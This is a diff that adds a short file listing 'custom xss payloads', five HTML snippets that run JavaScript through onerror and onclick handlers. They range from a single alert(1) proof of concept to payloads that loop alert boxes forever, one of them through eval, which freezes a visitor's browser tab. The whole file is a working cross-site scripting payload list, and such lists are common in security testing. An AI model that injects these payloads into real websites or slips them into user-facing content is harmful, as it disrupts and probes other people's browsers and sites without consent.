@@ -1,0 +1,7 @@
+custom xss payloads :
+
+["<img src=x onerror="while (true) { alert("it never stops!") }">"] - spams alert messages
+<img SRC=x onerror=alert(1)> - shows an alert that says '1'
+<x onclick=alert(1)>click me!</x> - on click shows an alert
+<img src=x onerror=eval('while (true) {alert("hi")}')> - spams alerts
+<span id="test" onclick="this.innerHTML = 'CONTENT ACTIVE';">CONTENT INACTIVE</span> - onclick function test
